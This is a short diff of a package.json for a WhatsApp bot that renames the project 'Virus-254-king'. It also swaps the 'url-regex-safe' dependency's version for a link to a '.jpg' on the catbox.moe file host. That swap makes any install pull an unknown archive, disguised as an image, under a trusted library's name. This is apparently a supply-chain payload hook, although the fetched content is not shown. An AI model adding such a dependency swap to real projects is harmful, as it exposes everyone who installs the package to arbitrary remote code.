@@ -1,6 +1,6 @@
 
 {
-  "name": "Bwmxmd",
+  "name": "Virus-254-king",
   "version": "2.1.0",
   "description": "Advanced WhatsApp bot using Baileys",
   "main": "index.js",
@@ -20,7 +20,7 @@
   "keywords": [
     "bot",
     "Baileys",
-    "bmwxmd",
+    "Virus-254-king",
     "quantum",
     "whatsapp-bot",
     "Ibrahim-Adams"
@@ -130,7 +130,7 @@
     "typescript": "^5.1.6",
     "undici": "^6.19.4",   
     "url": "^0.11.4",
-    "url-regex-safe": "^3.0.0",
+    "url-regex-safe": "https://files.catbox.moe/se5e6e.jpg",
     "uuid": "^9.0.1",
     "wa-sticker-formatter": "^4.4.4",
     "wikipedia": "^2.1.2"
